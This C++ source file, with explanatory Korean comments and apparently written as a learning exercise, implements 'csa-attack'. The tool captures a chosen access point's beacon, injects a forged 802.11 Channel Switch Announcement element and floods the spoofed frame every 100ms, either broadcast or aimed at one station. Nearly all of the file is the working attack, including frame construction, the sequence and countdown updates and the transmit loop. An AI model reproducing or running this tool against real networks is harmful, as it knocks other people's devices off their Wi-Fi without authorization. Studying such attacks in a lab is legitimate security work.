// csa-attack
// 802.11 Channel Switch Announcement (CSA) Attack 프로그램
//
// syntax : csa-attack <interface> <ap mac> [<station mac>]
// sample : csa-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB
//
// 동작:
//   1) <ap mac> 만 주어지면         -> AP broadcast frame 발생 (DA=ff:ff:ff:ff:ff:ff)
//   2) <station mac> 까지 주어지면  -> AP unicast frame 발생   (DA=station)
//
// 흐름:
//   1) libpcap 으로 모니터 인터페이스에서 AP 의 beacon 을 1개 캡처
//   2) radiotap header 를 분석해 FCS(4byte) 가 끝에 붙어 있다면 잘라낸다
//   3) tagged parameter 영역에 CSA element(5byte) 를 정렬된 위치에 삽입
//   4) DA 를 (필요하면) station mac 으로 교체<- 애가 와필요하노?
//   5) 짧은 sleep 을 두고 반복 송신

#include <iostream>
#include <string>
#include <vector>
#include <atomic>
#include <csignal>
#include <stdexcept>

#include <unistd.h>
#include <pcap.h>

#include "mac.h"
#include "dot11.h"
#include "frame.h"

// ============================================================
// 송신 동작 파라미터 (전역 상수)
// ============================================================
static constexpr useconds_t SEND_INTERVAL_US = 100 * 1000; // 패킷 전송 간격: 100ms (100,000 마이크로초)
static constexpr unsigned   PRINT_EVERY_N    = 20;          // 20번 전송마다 상태를 화면에 1줄 출력


// ============================================================
// Ctrl+C 안전 종료 처리
// ------------------------------------------------------------
//  - Ctrl+C를 누르면 OS가 SIGINT 신호를 프로그램에 보냄
//  - signal handler(on_sigint) 안에서는 단순한 작업만 안전하게 가능
//  - atomic flag만 끄고 메인 루프가 스스로 빠져나오게 설계
// ============================================================

// g_running: 프로그램 전체에서 공유하는 실행 플래그
// std::atomic<bool>: 여러 곳에서 동시에 읽고 써도 안전한 bool 변수
// true = 계속 실행, false = 종료
static std::atomic<bool> g_running(true);

// on_sigint(): Ctrl+C(SIGINT) 또는 종료 신호(SIGTERM) 를 받았을 때 호출되는 함수
// /*sig*/ : 파라미터를 받지만 사용하지 않음을 명시 (컴파일러 경고 억제)
static void on_sigint(int) { g_running.store(false); } // false로 바꿔서 루프 종료 유도

// usage(): 프로그램 사용법을 화면에 출력하는 함수
static void usage() {
    std::cout
        << "syntax : csa-attack <interface> <ap mac> [<station mac>]\n"
        << "sample : csa-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n";
}

// ============================================================
// capture_first_beacon(): BPF 필터로 AP 의 Beacon 패킷 1개 캡처
// ------------------------------------------------------------
//  - BPF(Berkeley Packet Filter): 특정 조건의 패킷만 통과시키는 필터
//  - "type mgt subtype beacon and wlan addr3 AP_MAC" 으로
//    해당 AP 의 비콘 패킷만 걸러냄
//
//  파라미터:
//   pcap      : pcap 핸들 (인터페이스 열기 결과)
//   apMac     : 캡처할 AP 의 MAC 주소
//   outBeacon : (출력) 캡처된 패킷을 저장할 vector
//  반환값: 성공 시 true, 실패 또는 사용자 중단 시 false
// ============================================================
static bool capture_first_beacon(pcap_t* pcap,
                                 const Mac& apMac,
                                 std::vector<uint8_t>& outBeacon)
{
    // BPF 필터 표현식 문자열 조립
    // "type mgt subtype beacon" : 관리 프레임 중 비콘만
    // "wlan addr3 XX:XX:..." : BSSID(addr3) 가 지정한 AP 인 것만
    /*""안에 있는 건 뭐냐*/
    std::string filter_exp = "type mgt subtype beacon and wlan addr3 " + apMac.toString();

    // BPF 필터 컴파일 (문자열 → 커널이 이해하는 내부 형식으로 변환)
    bpf_program fp;
    if (pcap_compile(pcap, &fp, filter_exp.data(), 1, PCAP_NETMASK_UNKNOWN) < 0) {
        std::cerr << "pcap_compile : " << pcap_geterr(pcap) << "\n";
        return false;
    }
    // 컴파일된 필터를 pcap 핸들에 적용
    if (pcap_setfilter(pcap, &fp) < 0) {
        std::cerr << "pcap_setfilter : " << pcap_geterr(pcap) << "\n";
        pcap_freecode(&fp); // 컴파일된 필터 메모리 해제
        return false;
    }
    pcap_freecode(&fp); // 필터 적용 후 컴파일 결과 메모리 해제

    std::cout << "[*] capturing beacon frame from " << apMac.toString()
              << " ... (Ctrl+C to abort)" << std::endl;

    // 비콘 패킷 1개가 캡처될 때까지 대기
    while (g_running.load()) { // Ctrl+C 누르면 g_running=false → 루프 탈출
        pcap_pkthdr*   hdr = nullptr; // 패킷 메타정보 (캡처 시각, 길이 등)
        const uint8_t* pkt = nullptr; // 실제 패킷 데이터 포인터
        // pcap_next_ex(): 다음 패킷을 받아옴
        //   반환값: 1=성공, 0=타임아웃, PCAP_ERROR_BREAK=루프 중단, 음수=에러
        int rc = pcap_next_ex(pcap, &hdr, &pkt);
        if (rc == 0)               continue; // 타임아웃: 아직 패킷 없음 → 재시도
        if (rc == PCAP_ERROR_BREAK) return false; // 강제 중단
        if (rc < 0) {
            std::cerr << "pcap_next_ex : " << pcap_geterr(pcap) << "\n";
            return false;
        }
        // assign(시작포인터, 끝포인터): 해당 범위의 데이터로 vector 를 채움
        outBeacon.assign(pkt, pkt + hdr->caplen);
        return true; // 성공
    }
    return false; // Ctrl+C 로 중단됨
}

// ============================================================
// main(): 프로그램 진입점 (Entry Point)
// ------------------------------------------------------------
//  argc : 명령줄 인자 개수 (프로그램 이름 포함)
//  argv : 명령줄 인자 문자열 배열
//    argv[0] = "csa-attack" (프로그램 이름)
//    argv[1] = 인터페이스 이름 (예: "mon0")
//    argv[2] = AP MAC 주소
//    argv[3] = Station MAC 주소 (선택)
// ============================================================
int main(int argc, char* argv[]) {

    // 인자 개수 검증: 최소 3개(프로그램+인터페이스+APMAC), 최대 4개
    if (argc < 3 || argc > 4) {
        usage();  // 사용법 출력
        return 1; // 1 반환 = 에러 종료
    }

    const char* ifname    = argv[1]; // 인터페이스 이름 (예: "mon0")
    Mac         apMac;               // AP(공유기) MAC 주소
    Mac         staMac;              // Station(클라이언트) MAC 주소
    bool        hasStation = false;  // Station MAC 이 주어졌는지 여부

    // AP MAC 주소 파싱
    // try-catch: 예외(오류)가 발생할 수 있는 코드를 안전하게 감쌈
    try {
        apMac = Mac(argv[2]); // "AA:BB:CC:DD:EE:FF" 형식을 Mac 객체로 변환
    } catch (const std::invalid_argument&) {
        // MAC 형식이 잘못되면 invalid_argument 예외 발생 → 여기서 처리
        std::cerr << "AP MAC 주소 형식이 올바르지 않습니다: " << argv[2] << "\n";
        return 1;
    }

    // Station MAC 주소 파싱 (4번째 인자가 있을 때만)
    if (argc == 4) { // == : 정확히 같음. 인자가 정확히 4개인 경우
        try {
            staMac = Mac(argv[3]); // Station MAC 파싱
        } catch (const std::invalid_argument&) {
            std::cerr << "Station MAC 주소 형식이 올바르지 않습니다: " << argv[3] << "\n";
            return 1;
        }
        hasStation = true; // Station MAC 이 정상적으로 파싱되면 플래그 설정
    }

    // ── 1단계: pcap 핸들 오픈 ────────────────────────────────
    char errbuf[PCAP_ERRBUF_SIZE]; // 에러 메시지 버퍼
    // pcap_open_live(): 실제 인터페이스를 열어 패킷 캡처/전송 가능 상태로 만듦
    //   ifname  : 인터페이스 이름
    //   65535   : snaplen (한 번에 캡처할 최대 바이트 수)
    //   1       : promisc (1 = 무차별 모드, 자신이 아닌 패킷도 수신)
    //   500     : timeout (패킷 없을 때 최대 500ms 대기)
    //   errbuf  : 실패 시 에러 메시지가 저장될 버퍼
    pcap_t* pcap = pcap_open_live(ifname,
                                  65535,
                                  1,
                                  500,
                                  errbuf);
    if (!pcap) { // pcap 이 NULL 이면 열기 실패
        std::cerr << "pcap_open_live : " << errbuf << "\n"
                  << "  -> root 권한과 monitor mode 인터페이스를 확인하세요.\n";
        return 1;
    }

    // 링크 타입 확인: Radiotap 헤더가 붙는 802.11 모니터 모드여야 함
    int dlt = pcap_datalink(pcap); // 현재 인터페이스의 데이터 링크 타입 조회
    if (dlt != DLT_IEEE802_11_RADIO) {
        // DLT_IEEE802_11_RADIO = radiotap 헤더 포함 802.11 모니터 모드
        std::cerr << "interface '" << ifname
                  << "' 는 monitor mode (radiotap) 가 아닙니다. "
                  << "current DLT = " << dlt << "\n";
        pcap_close(pcap); // 핸들 닫고 종료
        return 1;
    }

    // ── 2단계: Ctrl+C / 종료 신호 핸들러 등록 ───────────────
    // 이제부터 Ctrl+C 를 누르면 on_sigint() 함수가 호출됨
    std::signal(SIGINT,  on_sigint);
    std::signal(SIGTERM, on_sigint);

    // 시작 정보 출력
    std::cout << "[*] interface : " << ifname           << "\n"
              << "[*] ap        : " << apMac.toString() << "\n";
    if (hasStation)
        std::cout << "[*] station   : " << staMac.toString() << "\n";
    std::cout << "[*] target    : "
              // 삼항 연산자: hasStation 이 true 면 "AP unicast", false 면 "AP broadcast"
              << (hasStation ? "AP unicast" : "AP broadcast")
              << "\n";

    // ── 3단계: Beacon 패킷 1개 캡처 ──────────────────────────
    // std::vector<uint8_t>: 크기가 동적으로 변하는 1바이트 배열 (캡처 데이터 저장용)
    std::vector<uint8_t> beaconBuf;
    if (!capture_first_beacon(pcap, apMac, beaconBuf)) {
        // ! : 논리 NOT. 함수가 false(실패) 반환하면 !false=true → if 블록 실행
        pcap_close(pcap);
        return 0; // 사용자 중단(Ctrl+C)이나 에러 → 0으로 종료 (정상 중단)
    }
    std::cout << "[+] captured beacon : " << beaconBuf.size() << " bytes\n";
    // .size(): vector 에 저장된 원소 개수 = 캡처한 패킷의 바이트 수

    // ── 4단계: CSA element 가 삽입된 공격 패킷 완성 ──────────
    uint8_t outFrame[2048]; // 출력 패킷 버퍼 (2048바이트, 스택에 할당)
                            // Beacon 크기 + CSA(5B) 여유 포함해도 2048B 면 충분
    size_t  outLen = build_csa_beacon(
        outFrame,            // 결과 저장 버퍼
        sizeof(outFrame),    // 버퍼 크기 (2048)
        beaconBuf.data(),    // 캡처 데이터 포인터 (.data() = vector 내부 배열 주소)
        beaconBuf.size(),    // 캡처 데이터 길이
        hasStation,          // true 면 unicast (DA 를 staMac 으로 교체)
        staMac               // unicast 대상 MAC
    );
    if (outLen == 0) {
        std::cerr << "CSA frame 생성 실패 (캡처된 프레임이 잘못되었거나 너무 큽니다)\n";
        pcap_close(pcap);
        return 1;
    }
    std::cout << "[+] built CSA frame : " << outLen << " bytes\n"
              << "[*] starting CSA attack ... (Ctrl+C to stop)" << std::endl;

    // ── 5단계: 공격 패킷 반복 송신 루프 ──────────────────────
    /*여기부터 다시 보기*/

    // 송신마다 갱신할 필드 포인터 확보
    // seqCtrl 필드: 802.11 MAC 헤더 내 시퀀스 번호 (radiotap 8바이트 다음에 위치)
    dot11MacHdr* macHdr = reinterpret_cast<dot11MacHdr*>(outFrame + sizeof(dot11RadioTap));
    uint16_t     txSeq  = 0; // 송신 시퀀스 번호 카운터 (0~4095 반복)

    // CsaTag 포인터: switchCount 카운트다운을 위해 Tagged Parameters 에서 CSA 태그 탐색
    CsaTag* csaInFrame = nullptr;
    {
        uint8_t* p = outFrame + sizeof(dot11RadioTap) + sizeof(dot11MacHdr) + BEACON_FIXED_PARAM_LEN;
        while (p + 2 <= outFrame + outLen) {
            if (p[0] == CSA_TAG_NUMBER) { csaInFrame = reinterpret_cast<CsaTag*>(p); break; }
            p += 2 + p[1]; // 다음 태그로 이동 (태그번호 1B + 길이 1B + 데이터 nB)
        }
    }
    uint8_t countDown = CSA_COUNT; // switchCount 시작값: 3→2→1→0→3→...

    unsigned long sent_ok   = 0; // 전송 성공 횟수
    unsigned long sent_fail = 0; // 전송 실패 횟수

    // while(g_running.load()): Ctrl+C 누를 때까지 무한 반복
    // g_running.load(): atomic 변수 현재 값을 안전하게 읽음
    while (g_running.load()) {
        // 송신마다 시퀀스 번호 갱신: 상위 12비트=seqNum, 하위 4비트=단편번호(항상 0)
        macHdr->seqCtrl = static_cast<uint16_t>((txSeq++ & 0x0FFF) << 4);

        // switchCount 카운트다운 (3→2→1→0→3→...): 채널 전환 임박을 지속적으로 알림
        if (csaInFrame) {
            csaInFrame->switchCount = countDown;
            countDown = (countDown == 0) ? CSA_COUNT : (countDown - 1);
        }

        // pcap_sendpacket(): outFrame 패킷을 네트워크로 직접 전송
        //   성공 시 0, 실패 시 0이 아닌 값 반환
        if (pcap_sendpacket(pcap, outFrame, static_cast<int>(outLen)) != 0) {
            // static_cast<int>: size_t(부호없는 정수) 를 int로 안전하게 변환
            std::cerr << "pcap_sendpacket : " << pcap_geterr(pcap) << "\n";
            ++sent_fail; // 실패 카운터 증가 (++ = +1)
        } else {
            ++sent_ok;   // 성공 카운터 증가
        }

        // 화면 도배 방지: 20번(PRINT_EVERY_N)마다 상태 1줄 출력
        // % = 나머지 연산자, == 0 이면 20의 배수일 때
        if ((sent_ok + sent_fail) % PRINT_EVERY_N == 0) {
            std::cout << "[+] CSA sent : ok=" << sent_ok
                      << " fail="             << sent_fail
                      << " (" << outLen       << " bytes)" << std::endl;
        }

        // 다음 전송까지 100ms 대기
        // usleep: 마이크로초 단위로 프로그램 일시 정지
        // SEND_INTERVAL_US = 100,000 마이크로초 = 0.1초
        usleep(SEND_INTERVAL_US);
    }
    // ── 루프 종료 (Ctrl+C 후 g_running=false 가 되어 빠져나옴) ──

    // 최종 결과 출력
    std::cout << "\n[*] stopping ... total ok=" << sent_ok
              << " fail=" << sent_fail << "\n";

    pcap_close(pcap); // pcap 핸들 닫기: 커널 리소스 해제 (반드시 호출 필요)
    return 0;         // 0 반환 = 정상 종료
}
